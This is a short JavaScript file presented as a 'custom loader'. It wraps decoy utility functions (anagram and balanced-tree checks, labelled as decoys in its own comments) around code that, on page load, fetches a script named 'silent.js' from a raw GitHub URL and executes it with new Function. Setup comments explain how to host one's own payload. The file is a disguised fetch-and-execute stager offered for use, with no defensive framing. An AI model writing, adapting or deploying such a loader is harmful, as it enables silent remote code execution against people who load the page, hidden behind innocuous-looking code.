/**
 * Custom loader - fetches from YOUR GitHub instead of the original.
 * 
 * SETUP:
 * 1. Create a GitHub repo
 * 2. Upload silent.js to the main branch (e.g. main/silent.js)
 * 3. Replace YOUR_USERNAME and YOUR_REPO below with your GitHub username and repo name
 */
(function () {
  "use strict";

  // ========== CONFIGURE YOUR GITHUB URL ==========
  const PAYLOAD_URL = "https://raw.githubusercontent.com/G1ODd/c-kk/main/silent.js";

  // --- Decoy utilities (from original) ---
  function buildCharacterMap(str) {
    const map = {};
    for (const char of String(str || "").replace(/\W/g, "").toLowerCase()) {
      map[char] = (map[char] || 0) + 1;
    }
    return map;
  }
  function isAnagrams(a, b) {
    const m1 = buildCharacterMap(a), m2 = buildCharacterMap(b);
    const k1 = Object.keys(m1), k2 = Object.keys(m2);
    if (k1.length !== k2.length) return false;
    for (const k of k1) if (m1[k] !== m2[k]) return false;
    return true;
  }
  function getHeightBalanced(node) {
    if (!node) return -1;
    const L = getHeightBalanced(node.left), R = getHeightBalanced(node.right);
    if (L === Infinity || R === Infinity || Math.abs(L - R) > 1) return Infinity;
    return Math.max(L, R) + 1;
  }
  function isBalanced(node) {
    return getHeightBalanced(node) !== Infinity;
  }
  window.CheatUtils = { buildCharacterMap, isAnagrams, isBalanced, getHeightBalanced };

  function whenReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn);
    } else {
      fn();
    }
  }

  whenReady(function () {
    const url = PAYLOAD_URL + "?nocache=" + Date.now();
    fetch(url, { method: "GET" })
      .then(function (r) { return r.text(); })
      .then(function (code) {
        const fn = new Function("window", code);
        fn(window);
      })
      .catch(function (err) { console.error("Failed to load payload:", err); });
  });
})();
